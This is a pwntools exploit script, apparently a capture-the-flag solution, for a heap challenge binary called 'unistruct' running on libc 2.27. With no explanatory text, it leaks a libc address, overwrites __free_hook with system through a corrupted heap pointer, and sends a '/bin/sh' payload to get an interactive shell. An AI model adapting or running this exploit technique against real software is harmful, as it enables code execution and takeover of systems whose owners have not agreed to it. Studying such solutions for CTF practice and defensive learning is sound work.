from pwn import *

context.terminal = ["tmux", "new-window"]
context.log_level = True

is_remote = False
remote_addr = ['',0]

elf_path = "./unistruct"
libc_path = "/lib/x86_64-linux-gnu/libc-2.27.so"

if is_remote:
    p = remote(remote_addr[0], remote_addr[1])
else:
    p = process(elf_path, aslr = False)

if elf_path:
    elf = ELF(elf_path)
if libc_path:
    libc = ELF(libc_path)

ru = lambda x : p.recvuntil(x)
sn = lambda x : p.send(x)
rl = lambda   : p.recvline()
sl = lambda x : p.sendline(x)
rv = lambda x : p.recv(x)
sa = lambda a,b : p.sendafter(a,b)
sla = lambda a,b : p.sendlineafter(a,b)

def lg(s, addr = None):
    if addr != None:
        print('\033[1;31;40m[+]  %-15s  --> 0x%8x\033[0m'%(s,addr))
    else:
        print('\033[1;32;40m[-]  %-20s \033[0m'%(s))

def raddr(a = 6):
    if(a == 6):
        return u64(rv(a).ljust(8,'\x00'))
    else:
        return u64(rl().strip('\n').ljust(8,'\x00'))

def choice(i):
    sla(": ", str(i))

def add(idx, typ, siz):
    choice(1)
    choice(idx)
    choice(typ)
    choice(siz)

def show(idx):
    choice(3)
    choice(idx)

def edit(idx, content):
    choice(2)
    choice(idx)
    for (inplace, new_value) in content:
        ru(":")
        value = int(rl())
        choice(inplace)
        choice(new_value)

def free(index):
    choice(4)
    choice(index)

def receive_a_int():
    ru(": ")
    value = int(rl())
    return value

if __name__ == "__main__":
    add(0, 4, 0x200)
    show(0)

    choice(2)
    choice(0)

    receive_a_int()
    choice(1)
    choice(0)

    libc_addr = 0
    a = receive_a_int()
    choice(0)
    choice(a)

    a = receive_a_int()
    choice(1)
    choice(a)

    a = receive_a_int()
    choice(1)
    choice(a)
    libc_addr = a
    a = receive_a_int()
    choice(1)
    choice(a)

    libc_addr = a * 0x100000000 + libc_addr - 0x3ebca0
    lg("libc_addr", libc_addr)
    libc.address = libc_addr

    a = receive_a_int()
    choice(0)
    choice(0xcafebabe)

    add(1, 4, 0x10)
    free_hook = libc.symbols['__free_hook'] - 8
    system = libc.symbols['system']
    edit(1, [(0, 1), (1, free_hook & 0xFFFFFFFF), (1, free_hook >> 32), (0, 0xcafebabe)])
    add(2, 4, 0x10)
    choice(1)
    choice(3)
    choice(3)
    sla(": ", "/bin/sh\x00" + p64(system) * 6 + "\n")

    #add(3, 4, 0x10)
    #choice(2)
    #choice(3)
    #a = receive_a_int()
    #choice(1)
    #choice(0xdeadbeef)
    #edit(3, [(1, 0xdeadbeef), (1, system >> 32), (1, 0xcafebabe)])
    #edit(3, [(1, system & 0xFFFFFFFF), (1, system >> 32), (1, 0xcafebabe)])
    #gdb.attach(p)
    p.interactive()
